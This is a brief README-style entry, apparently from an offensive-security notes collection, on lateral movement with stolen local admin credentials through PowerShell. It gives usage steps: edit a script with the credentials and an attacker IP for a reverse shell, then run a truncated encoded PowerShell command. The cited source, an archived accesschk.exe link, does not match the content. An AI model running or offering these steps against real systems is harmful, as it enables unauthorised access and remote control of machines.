# Name
Local Admin Lateral Movement (Via Powershell)

## Usage
```
# Useful when local admin creds are obtained but cannot RDP/PSEXEC/WINRM

# Edit lines 5-6 to be local admin creds, line 8 for attacker's IP for simple_ps_revshell
python ps_script.py

# From Low Privileged Interactive cmd.exe:
powershell.exe -NoProfile -NonInteractive -EncodedCommand JABwAD0AQwBvA...

```

## Source
https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe

